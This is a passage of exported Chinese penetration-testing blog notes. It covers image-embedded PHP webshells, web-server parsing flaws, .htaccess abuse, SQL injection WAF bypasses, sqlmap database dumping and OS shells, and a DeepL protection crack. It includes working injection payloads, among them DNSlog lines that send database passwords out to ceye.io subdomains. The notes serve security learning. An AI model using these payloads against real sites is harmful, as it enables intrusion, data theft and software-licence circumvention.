@eval($_POST[x])?&gt;&#x27;)?&gt; 将文件保存成test.jpg格式，上传到服务器，假设上传路径为/upload，上传成功后，直接访问/upload/test.jpg/x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行（这个的执行过程看下面），所以图片里面的代码就会被执行。我们会神奇的发现在 /upload 目录下创建了一个一句话木马文件 shell.php。 临时解决办法：设置 cgi.fix_pathinfo为0 Ngnix解析漏洞 畸形解析漏洞(test.jpg/*.php) 原因：php的配置文件 php.ini 文件中开启了 cgi.fix_pathinfo（默认为1表示开启）。/etc/php5/fpm/pool.d/www.conf中不正确的配置security.limit_extensions，导致允许将其他格式文件作为php解析执行 例子： test.jpg存在（已上传），a.php不存在 访问：test.jpg/a.php。因为a.php，所以交给PHP处理；PHP发现没有这个文件，那么删除后面的a.php访问test.jpg，然后发现这个不是php文件，执行不了，于是返回Access denied。 但是Ngnix+php就可以，而且与Nginx无关，但在高版本的php中，由于security.limit_extensions 的引入，使得该漏洞难以被成功利用。因为Nginx只要一看URL中路径名以.php结尾，便不管该文件是否存在，直接交给php处理。而如Apache等，会先看该文件是否存在，若存在则再决定该如何处理。 cgi.fix_pathinfo是php具有的，若在php前便已正确判断了文件是否存在，cgi.fix_pathinfo便派不上用场了，这一问题自然也就不存在了。（IIS在这一点和Nginx是一样的，同样存在这一问题） %00空字节代码解析漏洞 原理：Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码 在以下版本的nginx中，我们在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码，此时，会把xxx.jpg文件当作php来执行。 Nginx 0.5.* Nginx 0.6.* Nginx 0.7 &lt;= 0.7.65 Nginx 0.8 &lt;= 0.8.37 CVE-2013-4547(%20%00) //跟畸形漏洞好像啊 影响nginx版本：nginx 0.8.41 ~ 1.5.6. 这一漏洞的原理是非法字符空格和截止符（%00）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。 即：假设服务器上存在文件：file.jpg(空格) ，注意文件名的最后一个字符是空格。则可以通过访问：http://127.0.0.1/file.jpg \\0.php 让Nginx认为文件file.jpg(空格)的后缀为.php。 上传一个test.jpg(空格)，然后访问它，因为访问时URL编码会将空格变成%20，所以访问的实际内容是test.jpg%20，不存在，那么我们访问test.jpgAAAphp，通过BP抓包，然后将三个A的ASCII分别改成：20 00 2e(这个翻译过来就是 点)。即我们访问的是有空格的php文件。但是Access denied，因为PHP的设置让我们没办法执行这个PHP文件代码（因为它不是php后缀），security.limit_extensions的存在，导致我们并不能利用此漏洞（跟畸形漏洞一个解释）。 Apache解析漏洞 文件名解析漏洞 从右往左解析，遇到不能执行的就继续向左解析，直到可以运行解析到可识别后缀 罕见后缀 上面的黑名单很多都是罕见的 htaccess文件与httpd.conf文件 .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过 .htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在 httpd.conf 文件中配置。 httpd.conf 和 .htaccess 用于配置 Apache Web 服务器（稍后我们将讨论它们之间的相同点和不同点）。另一方面，php.ini 用于配置 PHP 运行时，允许您在其上执行动态 Web 应用程序的 PHP 代码。 httpd.conf 和 .htaccess 都是 Apache Web 服务器的基于文本的配置文件。 httpd.conf 中的配置适用于整个服务器，而 htaccess 中的配置仅适用于它所在的文件夹（及其所有子文件夹）。 httpd.conf 文件在服务器启动时读取。当您对其进行更改时，您需要重新启动 Apache。另一方面，.htaccess 文件在每次 HTTP 请求时都会被读取，因此对它们的更改不需要重新启动服务器。 生效的前提： 12mod_rewrite 模块开启AllowOverride All(默认为None) 常见： 把所有名字里面带有shell的文件当成php脚本来执行 123&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 让.jpg后缀名文件格式的文件名以php格式解析 1AddType application/x-httpd-php .jpg 问题： 如果配置错误会出现错误：Internal Server Error 图片木马出现：Parse error: syntax error, unexpected ')' in /var/www/html/upload/piccreate_muma.jpg on line 14 漏洞修复（中间件/CVE/其他漏洞） 编辑器漏洞 这个编辑器就是网页的那种编辑器，例如有的网站有编辑器，使用第三方，然后对音频、文字进行处理。大多数网页编辑器的漏洞都是上传漏洞！ 手册：https://docs.google.com/document/d/1w_61xR8U7nmn4Y0CvBHpG1uFIU2ORx69QnqTxQt8Km0/edit?pli=1 漏洞利用 需要知道两个点： 使用了什么编辑器（名字+版本） 知道编辑器的路径 然后： 在网上查exp，在本地执行，使用它的脚本攻击这个网站 那么，怎么知道使用了什么编辑器？ 网站扫描 在后台看插件 CMS上传 通达OA：当发现一个OA系统，搜索他有什么漏洞，然后根据exp运行就好。会有很多方案，例如先上传后通过文件包含来运行。 防御 不要暴露上传文件的位置 禁用上传文件的执行权限 黑白名单 对上传的文件重命名，不易被猜测 对文件内容进行二次渲染 对上传的内容进行读取检查","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"一些有用的破解—日常篇","slug":"一些有用的破解—日常篇","date":"2023-05-25T00:56:16.000Z","updated":"2023-05-25T01:02:10.131Z","comments":true,"path":"articles/2023/05/25/一些有用的破解—日常篇/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/25/%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84%E7%A0%B4%E8%A7%A3%E2%80%94%E6%97%A5%E5%B8%B8%E7%AF%87/","excerpt":"","text":"Deepl pro 破解翻译后的docx文档只读 问题描述：使用DeepL翻译出来的文档是只读模式，显示不订阅pro版本之前都是不能编辑。 解决方法：将文档另存为.xml文档，然后右键用记事本打开，CTRL+F查找：&lt;w:documentProtection,，找到之后，有两种方法： 删除这一段完整标签&gt;，保存，之后修改文档后缀名为.doc，打开之后发现文档已经可以编辑了。 找到Protection后 w:enforcement=“1” 改为 w:enforcement=“0” 重命名为.doc 就OK了 破解网页版5000字限制 看：https://github.com/blueagler/DeepL-Crack","categories":[{"name":"杂","slug":"杂","permalink":"https://j3f5.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"破解","slug":"破解","permalink":"https://j3f5.github.io/tags/%E7%A0%B4%E8%A7%A3/"}]},{"title":"SQL注入进阶-WAF绕过与SQLMAP工具的使用","slug":"SQL注入进阶-WAF绕过与SQLMAP工具的使用","date":"2023-05-24T06:46:22.000Z","updated":"2023-05-25T01:16:01.277Z","comments":true,"path":"articles/2023/05/24/SQL注入进阶-WAF绕过与SQLMAP工具的使用/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%BB%95%E8%BF%87%E4%B8%8ESQLMAP%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"WAF绕过 WAF识别与WAF策略 这里不详细说，简单提一下：项目：wafw00f To do its magic, WAFW00F does the following: Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions.（发送HTTP包，并且分析包中的特征，来判断，这可以判断一大批） If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is. 如果不成功，将发送许多(可能是恶意的)HTTP请求，并使用简单的逻辑来推断它是哪个WAF If that is also not successful, it analyses the responses previously returned and uses another simple algorithm to guess if a WAF or security solution is actively responding to our attacks. 如果这也不成功，它将分析先前返回的响应，并使用另一种简单算法来猜测WAF或安全解决方案是否正在积极响应我们的攻击。 WAF策略 WAF针对SQL注入攻击的检测原理是检测SQL关键字、特殊符号、运算符、操作符、注释符的相关组合特征，并进行匹配。 SQL关键字（如 union，Select，from，as，asc，desc，order by，sort，and ，or，load，delete，update，execute，count，top，between，declare，distinct，distinctrow，sleep，waitfor，delay，having，sysdate，when，dba_user，case，delay 等） 特殊符号（’”,; ()） 运算符（±*/%|） 操作符（=，&gt;,&lt;,&gt;=,&lt;=,!=,+=,-=） 注释符（–，/**/） 数据绕过 除了上图提到的简单的这里不解释了（大小写、双写嵌入等） 关键字绕过 大小写、双写嵌入 堆叠注入，绕过select等 注释符绕过： 常用：//，-- , /**/, #, --+, -- -, ;,%00,--a，绕过：Uni/**/on 等价函数绕过 12345678910111213141516171819202122232425and=&amp;&amp; or=|| xor=| not=!# 比较符号（&lt;&gt;）绕过# 使用greatest()、least()# 使用between and。注：between 1 and 1; 等价于 =1hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir()# 举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 或者：substr((select &#x27;password&#x27;),1,1) = 0x70strcmp(left(&#x27;password&#x27;,1), 0x69) = 1strcmp(left(&#x27;password&#x27;,1), 0x70) = 0strcmp(left(&#x27;password&#x27;,1), 0x71) = -1 绕过符号 逗号 使用from或者offset。 在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决： 12select substr(database() from 1 for 1);select mid(database() from 1 for 1); 使用join： 12union select 1,2 #等价于union select * from (select 1)a join (select 2)b 使用like： 12select ascii(mid(user(),1,1))=80 #等价于select user() like &#x27;r%&#x27; 重点：对于limit可以使用offset来绕过： 123select * from news limit 0,1# 等价于下面这条SQL语句select * from news limit 1 offset 0 空格 用tab代替空格，或者用其他空格符%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/ 使用浮点数： 12select * from users where id=8E0union select 1,2,3select * from users where id=8.0 select 1,2,3 括号绕过： 这种过滤方法常常用于time based盲注,例如： 1?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23 等于号 使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt; between 1 and 1; 等价于 =1 引号 宽字节/二次编码注入 编码绕过（用于编译一个字符串，例如查询 id='users'，则可以编译成id=0x0x7573657273十六进制） 通用绕过（编码）非关键字字符串 如URLEncode编码，ASCII,HEX,unicode编码绕过：or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。 HTTP参数污染 HTTP参数污染（HTTP Parameter Pollution） 攻击者通过在HTTP请求中插入特定的参数来发起攻击,如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击。 原理 在跟服务器交互的过程中，http允许get或者post多次传同一个参数，造成覆盖从而绕过waf的效果。也就是http协议允许同样的名称的参数出现多次，但是不同服务器的处理方式会不一样。 Web服务器 参数获取函数 获取到的参数 PHP/Apache $_GET(“par”) Last JSP/Tomcat Request.getParameter(“par”) First Perl(CGI)/Apache Param(“par”) First Python/Apache getvalue(“par”) All(list) ASP/IIS Request.QueryString(“par”) ALL(comma-delimited string) 绕过 waf服务器（tomcat）只解析重复参数里面的前者，而真正的web服务器（Apache）只解析重复参数里面的后者，我们可以传入两个id参数，前者合法而后者为我们想注入的内容 我们的后端是apache，那么我们只要将参数放在后面即可 注入样例：bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3 WAF逻辑层绕过 逻辑问题 云waf防护，一般我们会尝试查找真实站点的真实ip，从而绕过CDN防护 当提交，GET，POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入，可尝试bypass http和https同时开放服务，没有做http到https的强制跳转，导致https有waf防护，http没有防护，直接访问http站点绕过防护 特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害输入，从而导致bypass 比如：id=1%00and 1=2 union select 1,2,column_name from imformation_schema.columns 性能问题 猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。 猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。 例子： ?id=1and(select1)=(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9 PS：0xA*1000指0xA后面”A&quot;重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。 白名单 IP白名单 从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。 测试方法：修改http的header来bypasswaf X-forwarded-for X-remote-IP X-originating-IP x-remote-addr X-Real-ip 静态资源 特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测 效率，不去检测这样一些静态文件名后缀的请求。 http://10.9.9.201/sql.php?id=1 http://10.9.9.201/sql.php/1.js?id=1 备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别 url白名单 为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势 各种数据库的特殊绕过 参考：https://www.cnblogs.com/SnowSec/p/14288249.html SQLMAP 使用 检查注入点 GET：sqlmap -u http://192.168.208.1:49154/Less-5/?id=1 POST： sqlmap -u http://192.168.208.1:49154/Less-5/ --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot; sqlmap -r post.txt （当前用户下的所有）数据库（–dbs） sqlmap -r post.txt --dbs -v 3 获取当前数据库名：--current-db 查询表（先通过-D指定数据库） 1sqlmap -r post.txt -v 3 -D security --tables 查询列名（先通过-D指定数据库 -T指定表名） 1sqlmap -r post.txt -v 3 -D security -T users --columns 脱库（先通过-D指定数据库 -T指定表名） -C指定列名 然后–dump 1sqlmap -r post.txt -v 3 -D security -T users -C username --dump 直接全部脱出来 1sqlmap -r post.txt -v 3 -D security -T users --dump 获取系统信息 数据库的用户与密码 12sqlmap -r post.txt -v 3 --userssqlmap -r post.txt -v 3 --passwords 获取当前用户名：--current-user ​ 然后去cmd5里查询类型为mysql5的哈希密文，破解即可 --is-dba：当前用户是否为管理权限 该命令用于查看当前账户是否为数据库管理员账户，如下所示 1234567┌──(j3fffff㉿j3fffff)-[~/tmpdir]└─$ sqlmap -r post.txt -v 3 --is-dba[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20),0x7171707071),NULL#[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,JSON_ARRAYAGG(CONCAT_WS(0x697564697a67,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END))),0x7171707071),NULL#[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END),0x7171707071),NULL#[11:03:25] [DEBUG] performed 2 queries in 0.03 secondscurrent user is DBA: True 这个payload是可以学习的 --roles：列出数据库管理员角色 执行命令 运行自定义sql语句 运行--sql-shell 运行操作系统命令 --os-cmd，--os-shell：运行任意操作系统命令. 在当前用户有权限使用特定的函数的前提下，如果数据库为MySQL、PostgreSQL，Sqlmap会上传一个二进制库，包含用户自定义的函数sys_exec () 和sys_eval ()，那么创建的这两个函数就可以执行系统命令。 如果数据库是微软 SQL Server时，Sqlmap通过存储过程 xp_cmdshell 来执行任意命令，如果 xp_cmdshell 被禁用(SQL Server 2005及以上版本默认被禁用)，则Sqlmap会重新启用它；如果不存在，会自动创建。 用–os-shell参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时(如PHP或ASP+Mysql)，仍然可以使用 INTO OUTFILE写进可写目录，创建一个Web后门。 Sqlmap支持ASP、ASP.NET、JSP和PHP四种语言（要想执行该参数，需要有数据库管理员权限，也就是–is-dba的值要为True)。 读取文件 该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或MicrosoftSQL Server，并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。 1sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-read &quot;C:/11.txt&quot; 上传文件 --file-write --file-dest：上传文件到数据库服务器中。该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。 1sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-write &quot;C:/1.txt&quot; --file-dest &quot;C:/windows/Temp/1.php&quot; WAF绕过 WAF检测Ugent名单，使用sqlmap时可以加上参数–random agent（随机出现字母头），也可以自己设置 1--user-agent=&quot;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&quot; sqlmap的速度过快，所以会被拦截，则添加延时参数 --delay参数 使用代理池，随机出IP，绕过IP白名单。或者自己设置代理：--proxy=http://127.0.0.1:8080 利用–tamper参数中的编码脚本 自己编写中转脚本","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入进阶-堆叠、二次、DNS注入、各位置注入等","slug":"SQL注入进阶-堆叠、二次、DNS注入、各位置注入等","date":"2023-05-24T06:22:40.000Z","updated":"2023-05-25T01:14:52.450Z","comments":true,"path":"articles/2023/05/24/SQL注入进阶-堆叠、二次、DNS注入、各位置注入等/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/","excerpt":"","text":"堆叠注入（可绕过select）用法参考advance 堆叠注入就是将一堆sql语句叠加在一起执行，使用分号结束上一个语句再叠加其他语句一起执行。试想一下我们在; 结束一个 sql语句后继续构造下一条语句, 会不会一起执行？因此这个想法也就造就了堆叠注入。 与union jection(联合注入)的区别：区别就在于 union或者 union all 执行的语句类型是有限的, 可以用来执行查询语句, 而堆叠注入可以执行的是任意的语句。 但是不同的数据库有不同的注入语句。 查询时通常只返回一个结果，导致后面的SQL语句可能无法回显到页面上 例子：修改数据：select * from user_test;update user_test set name='modify' where name='张三'; 注：上面的介绍中我们已经提及，oracle不能使用堆叠注入，可以从图中看到，当有两条语句在同一行时，直接报错。无效字符。 宽字节注入&amp;&amp;二次编码注入&amp;&amp;二次注入 宽字节注入 在mysql中，用于转义（即在字符串中的符号前加上\\）的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性（会返回false）。 意义：php gpc开启会转义单引号，导致字符注入时无法闭合单引号，宽字节注入就可以吃掉转义字符从而进行注入。 重点：%df%27 注意： 我们在之前介绍过“set names gbk”其实干了三件事，等同于：SET character set connection='gbk',haracter set results='gbk',character_set client='gbk'，而这段是存在宽字节注入的，一旦其中一个不是gdk，例如最后一个character_set client=binary，那么就是不存在了。 字符集（宽） GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。 MySQL的字符集转换过程 MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection; 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：（一级一级往上升，找到配置） 使用每个数据字段的CHARACTER SET设定值; 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准); 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值; 若上述值不存在，则使用character_set_server设定值。 将操作结果从内部操作字符集转换为character_set_results。 重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。 注入原理 GBK 占用两字节 ASCII占用一字节 PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\\”），MYSQL默认字符集是GBK等宽字节字符集。 大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\\，变成了 %df\\’，其中\\的十六进制是 %5C ，那么现在 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为%df%5c是一个宽字符，也就是縗，也就是说：%df\\’ = %df%5c%27=縗’（单引号逃逸），有了单引号就好注入了。 也就是本来是1(23)，其中2用来注释3，但是因为宽字节会变成(12)3，这样3就独立出来了。所以，诀窍是让(12)成为一个可以被解析的宽字符就行。 1234$sql = &quot;select * from user where username=&#x27;$username&#x27;&quot;; payload:-1%df%27 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;table.name&#x27; # (后面的&#x27;&#x27;可以使用16进制编码，编码结束后在前面加上0x) 常见URL编码 URL编码 注释 %27 单引号 %20 空格 %23 #号 %5c /反斜杠 header改为gbk：header(&quot;Content-type:text/html;charset=gbk&quot;); 防御 使用mysql_set_charset(utf8)指定字符集 使用mysql_real_escape_string进行转义 这同样也是存在漏洞的，另外官方建议使用mysql_set_charset方式来设置编码，不幸的是它也只是调用了SET NAMES,所以效果也是一样的。不过mysql set_charset调用SET NAMES之后还记录了当前的编码，留着给后面mysql_real_escape_string处理字符串的时候使用，所以在后面只要合理地使用mysql_real_escape_string还是可以解决这个漏洞的，关于这个漏洞的解决方法推荐如下几种方法： 在执行查询之前先执行SET NAMES’gbk’,character_set_client=-binary设置character set client binary. 使用mysql_set_charset(‘gbk’)设置编码，然后使用mysql_real_escape_string()函数被参数过滤。 使用pdo方式，在PHP5.3.6及以下版本需要设置setAttribute (PDO:ATTREMULATE_PREPARES,false);来禁用prepared statements的仿真效果。 二次编码注入 二次编码注入和宽字节注入有着异曲同工之妙，都是在面对PHP代码或者配置，对输入的‘(单引号)进行转义的时候，在处理用户输入的数据时存在问题，绕开了转义。 这里不是宽字节注入的GBK编码，而是UFT-8，所以宽字节注入不管用。 重点：%2527 URL编码 编码肯定是因为原始的格式并不适合传输才进行的，例如+，=，&amp;，;等符号在http请求过程中会与原有格式进行冲突，所以需要进行编码转换。 比如某登录场景：index.php?id=1$name=admin$pwd=123。账号密码中带有=号和&amp;号，就可能导致冲突，这些就需要进行url编码 比如： 编码前：name=admin= 编码后：name=admin%3d 通常后端程序会自动进行解码，比如php的urldecode()函数：urldecode('%3d') 二次编码 urldecode()与PHP本身处理编码时，两者配合失误，可以构造数据消灭斜线。 当输入id=1%27或者id=1’，都会被过滤（加上了\\） 当输入id=1%2527就可以让%25--&gt;%，所以合起来，就会变成%27，刚好能够注入。 二阶注入（二次注入） 示例是由：创建用户，登录和修改密码组成。 当我们遇到特殊字符转义的时候（例如：mysql_real_escape_string） mysql_real_escape_string: 将转义特殊字符：\\x00, \\n, \\r, \\, ', &quot;, \\x1a 当我们注册的用户名为admin'#，即使转义了，但是在数据库中是存在的，可以直接调出来，修改密码的地方并没有过滤，那么我们可以进行二次注入。 $sql = &quot;UPDATE users SET PASSWORD='$pass' where username='admin '#' and password='$curr_pass'&quot;; 好文章，待会看： ZZCMS v8.3二阶注入：https://www.freebuf.com/vuls/183360.html ZoneMinder：https://www.4hou.com/info/news/19267.html Joomla3.8.2：https://blog.csdn.net/publicStr/article/details/80261667 二次注入漏洞挖掘：https://www.secpulse.com/archives/76506.html 二阶注入研究论文：http://www.doc88.com/p-6931153563831.html DNS注入（盲注DNSlog外带） 原理：首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下 原理 DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。 利用场景：在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，且在现代WAF的防护下，很可能导致IP被ban，这时候就要用到我们的DNSlog注入。 推荐平台：dnslog, admindnslog, ceye, BulidDNS 攻击 目标使用Mysql：SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\\\abc')); 前人的payload： ?id=1’ and if((select load_file(concat(’\\\\\\\\’,(select database()),’.sojcvo.ceye.io\\\\aaa’))),1,0)--+ ?id=1' and if((select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.sojcvo.ceye.io\\\\aaa'))),1,0)--+ ?id=1' and if((select load_file(concat('\\\\\\\\',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.sojcvo.ceye.io\\\\abc'))),1,0)-- + 用 concat_ws() 函数分割，因为在 load_file() 里面不能使用 @ ~ 等符号分割，用 hex() 函数转成十六进制，出来结果了再转回去即可。 然后在ceye.io中看输出。 各位置注入 提交方式：get/post get只有一次传输 post传输头得到100 continue后再传data 注入类型：json/数字/字符串 注入点： Cookie Header：User-Agent（）可能存在有数据库的交互，记录在$_SERVER中","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入进阶-各种数据库的注入方式","slug":"SQL注入进阶-各种数据库的注入方式","date":"2023-05-23T10:24:39.000Z","updated":"2023-05-25T01:15:16.457Z","comments":true,"path":"articles/2023/05/23/SQL注入进阶-各种数据库的注入方式/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/","excerpt":"","text":"介绍 什么决定网站注入点用户权限？数据库配置文件 常用数据库 常见的数据库：Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等 这些数据库除了Access没有数据库名外，其他都类似，有：数据库名+表名+列名+数据 关系型数据库：通过外键关联来建立表与表之间的关系。由二维表及其之间的联系组成的一个数据组织。如：Oracle、DB2、MySql 非关系型数据库：通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。非关系型数据库产品是传统关系型数据库的功能阉割版本，通过减少用不到或很少用的功能，来大幅度提高产品性能。如：NoSql、Cloudant。 判断sql注入数据库类型方法 如果可以，直接通过端口/默认语言判断 默认语言搭配数据库： 组合类型asp + access/mssql 组合类型php + mysql 组合类型aspx+mssql 组合类型jsp +mysql/oracle 组合类型Python + MongoDB 常见数据库的默认端口： 关系型数据库 mysql 3306 sqlserver 1433 oracle 1521 psotgresql 5432 非关系型数据库 MongoDB 27017 Redis 6379 memcached 11211 是否可以使用特定的函数来判断，该数据库特有的 在mssql中可以调用substring。oracle则只可调用substr mssql不可以调用version() 是否可以使用辅助的符号来判断，如注释符号、多语句查询符等等 /*是MySQL中的注释符，返回错误说明该注入点不是MySQL； --是Oracle和MSSQL都支持的，但是;是Oracle不支持的，因为它不支持多行查询。 是否可以编码查询 是否显可以利用错误信息 例如：错误提示Microsoft JET Database Engine 错误 ‘80040e14’，说明是通过JET引擎连接数据库，则表明数据库为ACCESS数据库，如果是ODBC的话则说明是MSSQL数据库。 是否存在数据库某些特性辅助判断 特殊表：access(msysobjects)，mssql(sysobjects)，oracle(sys.user_tables)，mysql(information_schema) 参考：https://www.jianshu.com/p/e308d96e2ecd MYSQL 常见手法 找到注入点 and 1=1 and 1=2 测试报错 order by 5 # 到5的时候报错，获取字段总数为4 id=0(不是1就行，强行报错) union select 1,2,3,4 # 联合查询，2和3可以显示信息 获取数据库信息 123user() ==&gt;rootdatabase() ==&gt;mozhe_Discuz_StormGroupversion() ==&gt;5.7.22-0ubuntu0.16.04.1 获取数据库表 12345table_name 表名information_schema.tables 系统生成信息表table_schema=数据库名16进制或者用单引号括起来# 改变limit 0,1中前一个参数，得到其他表 获取列名 脱库 信息搜集（前面提过） 在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名） 1234SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，table_schema和table_name分别来存储数据库名和表名information_schema.tables 记录所有的表information_schema.columns 记录所有的列 MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行getshell操作，其中也会遇到很多的阻碍，相关防御手法也要明确，所谓知己知彼，百战不殆。作为安全开发工作者，攻防兼备。 